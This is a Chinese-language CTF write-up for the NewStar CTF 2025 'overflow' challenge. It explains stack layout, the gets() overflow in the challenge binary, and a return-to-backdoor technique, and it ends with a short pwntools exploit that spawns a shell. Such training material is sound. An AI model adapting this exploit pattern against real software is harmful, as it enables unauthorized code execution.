---
titleTemplate: ":title | WriteUp - NewStar CTF 2025"
---

# overflow

> [!INFO]
> 本题考查的是 栈溢出和对栈结构的理解

在本题开始之前，你需要先了解栈结构与栈溢出。


栈是一种典型的后进先出 <span data-desc>(Last in First Out)</span> 的数据结构，它的基本结构是栈顶<span data-desc>（rsp 寄存器的值）</span>和栈底<span data-desc>（rbp 寄存器的值）</span>。其操作主要有压栈<span data-desc> (push) </span>与出栈<span data-desc> (pop)</span> 两种操作；push 可以把寄存器里的值或者一个立即数压入栈，pop 则是把 rsp 寄存器<span data-desc>（也就是栈顶）</span>指向的值弹出给一个寄存器。

push 操作：
![图片](https://docimg3.docs.qq.com/image/AgAABTcvgiMElRDg3_dDp621aDNW2Xbb.png?w=916&h=618)
pop操作：
![图片](https://docimg8.docs.qq.com/image/AgAABTcvgiMc16ywA4RKurHz9Wq0S-AZ.png?w=1254&h=603)
> [!TIP]
    以64位为例，对于函数调用栈来说，rbp-8的位置会跟随一个“return”，return决定了函数的返回地址。
栈溢出漏洞：通过向栈中写入超出预期的数据，覆盖返回地址或其他关键数据，从而劫持程序的执行流
本题的try函数中有一个gets函数，这个函数不限制读入的长度，就会造成栈溢出
![图片](https://docimg2.docs.qq.com/image/AgAABTcvgiObWhDD76VFSKHMJh-ApWaE.png?w=1322&h=353)
本题还有一个后门函数，那接下来思路就很清晰了，先填垃圾数据把栈填满，然后把return的位置写上我们的后门函数的地址就能顺利执行system("/bin/sh")
![图片](https://docimg9.docs.qq.com/image/AgAABTcvgiNSeKqXX4VDXrJgzGwSODUP.png?w=1721&h=620)
> [!TIP]
    这里的返回地址不能直接填0x401200，会造成栈不对齐的问题，填0x401201即可
下面附上exp:
```python
from pwn import *
r=remote('ip',port)
#r=process('./overflow')
payload=b'A'*0x108+p64(0x401201)
r.sendline(payload)
r.interactive()
```